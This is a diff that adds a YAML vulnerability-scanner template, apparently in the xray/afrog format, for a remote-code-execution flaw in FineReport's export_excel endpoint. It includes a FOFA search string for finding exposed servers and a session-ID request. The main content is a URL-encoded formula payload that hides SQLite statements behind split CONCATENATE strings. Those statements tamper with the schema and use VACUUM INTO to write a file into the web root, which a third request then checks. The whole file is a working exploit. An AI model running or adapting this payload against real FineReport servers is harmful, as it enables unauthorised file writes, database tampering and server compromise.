@@ -1,0 +1,36 @@
+id: poc-yaml-finereport-export-excel-rce
+info:
+  name: 帆软报表 export_excel 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: finereport
+  fofa: body="Powered by 帆软"
+variables:
+  paths: '/webroot/
+
+    /WebReport/
+
+    /seeyonreport/
+
+    /'
+  random: random_str(10)
+requests:
+- method: POST
+  path: '{{.paths}}ReportServer'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: op=getSessionID&viewlets=[5b]{'reportlet':'/'}[5d]&
+  expression: status_code == 200 && !contains(body,"<")
+  output:
+  - regex_match(body,"(?P<sessionid>[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
+- method: GET
+  path: '{{.paths}}decision/nx/report/v9/largedataset/export/excel?functionParams=%7b%7d&__parameters__=%7b%7d'
+  headers:
+    sessionID: '{{.sessionid}}'
+    params: '%3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27123%22%2C%22%27%22%2C%22%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%22{{.random}}%22%2C%22.%22%2C%22t%22%2C%22x%22%2C%22t%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E'
+  expression: status_code == 200 && contains(headers,"filename=") && contains(content_type,"application/x-excel")
+- method: GET
+  path: '{{.paths}}{{.random}}.txt'
+  expression: status_code == 200 && contains(body,"SQLite")
+transport: http
